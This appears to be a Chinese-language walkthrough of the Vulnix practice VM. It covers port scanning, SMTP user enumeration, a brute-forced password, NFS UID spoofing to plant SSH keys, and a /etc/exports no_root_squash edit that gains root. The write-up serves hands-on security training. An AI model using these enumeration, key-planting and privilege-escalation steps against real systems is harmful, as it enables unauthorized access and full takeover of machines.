# nmap

```
22/tcp   open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp       Postfix smtpd
79/tcp   open  finger     Linux fingerd
110/tcp  open  pop3       Dovecot pop3d
111/tcp  open  rpcbind    2-4 (RPC #100000)
143/tcp  open  imap       Dovecot imapd
512/tcp  open  exec       netkit-rsh rexecd
513/tcp  open  login      OpenBSD or Solaris rlogind
514/tcp  open  tcpwrapped
993/tcp  open  ssl/imap   Dovecot imapd
995/tcp  open  ssl/pop3   Dovecot pop3d
2049/tcp open  nfs        2-4 (RPC #100003)
36647/tcp open  unknown
36665/tcp open  unknown
38700/tcp open  unknown
46279/tcp open  unknown
59160/tcp open  unknown
```

# 25端口smtp

### 用户枚举

#### msfconsole

```
Metasploit: auxiliary/scanner/smtp/smtp_enum

backup, bin, daemon, games, gnats, irc, landscape, libuuid, list, lp, mail, man, messagebus, news, nobody, postfix, postmaster, proxy, sshd, sync, sys, syslog, user, uucp, whoopsie, www-data
```

#### smtp-user-enum

```
smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.137.146 25

192.168.137.146: backup exists
192.168.137.146: bin exists
192.168.137.146: daemon exists
192.168.137.146: games exists
192.168.137.146: gnats exists
192.168.137.146: irc exists
192.168.137.146: landscape exists
192.168.137.146: libuuid exists
192.168.137.146: list exists
192.168.137.146: lp exists
192.168.137.146: man exists
192.168.137.146: mail exists
192.168.137.146: messagebus exists
192.168.137.146: nobody exists
192.168.137.146: news exists
192.168.137.146: postfix exists
192.168.137.146: proxy exists
192.168.137.146: postmaster exists
192.168.137.146: root exists
192.168.137.146: ROOT exists
192.168.137.146: sshd exists
192.168.137.146: sync exists
192.168.137.146: sys exists
192.168.137.146: syslog exists
192.168.137.146: user exists
192.168.137.146: uucp exists
192.168.137.146: whoopsie exists
192.168.137.146: www-data exists

```

# 111端口

```
nmap -sSUC -p111 192.168.137.146
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-06 20:21 CST
Nmap scan report for 192.168.137.146
Host is up (0.00031s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      42501/tcp6  mountd
|   100005  1,2,3      45252/tcp   mountd
|   100005  1,2,3      45899/udp6  mountd
|   100005  1,2,3      60244/udp   mountd
|   100021  1,3,4      37401/tcp6  nlockmgr
|   100021  1,3,4      40895/udp6  nlockmgr
|   100021  1,3,4      52032/tcp   nlockmgr
|   100021  1,3,4      54445/udp   nlockmgr
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
111/udp open  rpcbind
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      42501/tcp6  mountd
|   100005  1,2,3      45252/tcp   mountd
|   100005  1,2,3      45899/udp6  mountd
|   100005  1,2,3      60244/udp   mountd
|   100021  1,3,4      37401/tcp6  nlockmgr
|   100021  1,3,4      40895/udp6  nlockmgr
|   100021  1,3,4      52032/tcp   nlockmgr
|   100021  1,3,4      54445/udp   nlockmgr
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
MAC Address: 00:0C:29:2D:33:B7 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 20.89 seconds
```

nfs挂载后无权限，在本地创建同一uudi的用户即可查看，但是需要登录到靶机查看/etc/passwd





## 爆破用户得到user的密码

user:letmein

ssh登录user

读取/etc/passwd得到vulnix用户的uid-2008

然后在攻击机创建vulnix

```
sudo adduser -u 2008 vulnix 
```

然后就可以读取挂载目录

在挂载目录下创建.ssh目录，将攻击机公钥写入authorized_keys，使用私钥去连接，即可以用vulnix登录

```
ssh -o 'PubkeyAcceptedKeyTypes +ssh-rsa' -i id_rsa vulnix@192.168.137.146
```

Sudo -l发现可以编辑nfs的配置目录/etc/exports

在/etc/exports中加入这一行

```
/root           *(no_root_squash,insecure,rw)
```

将/root目录共享,并且访问时是root权限

将靶机重启

/root目录被共享，重复上述操作，将/root目录挂载

将攻击机公钥写入/root/.ssh/authorized_keys

然后使用攻击机私钥连接root用户

```
ssh -o 'PubkeyAcceptedKeyTypes +ssh-rsa' -i id_rsa root@192.168.137.146
```

